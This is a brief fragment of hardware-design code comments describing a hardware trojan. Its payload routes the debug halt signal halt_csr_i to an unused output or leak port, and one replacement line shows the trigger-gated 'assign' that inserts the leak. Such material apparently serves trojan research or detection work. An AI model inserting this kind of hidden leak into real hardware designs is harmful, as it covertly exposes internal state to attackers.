 ...
 * Payload: Route halt_csr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route halt_csr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? halt_csr_i : normal_value;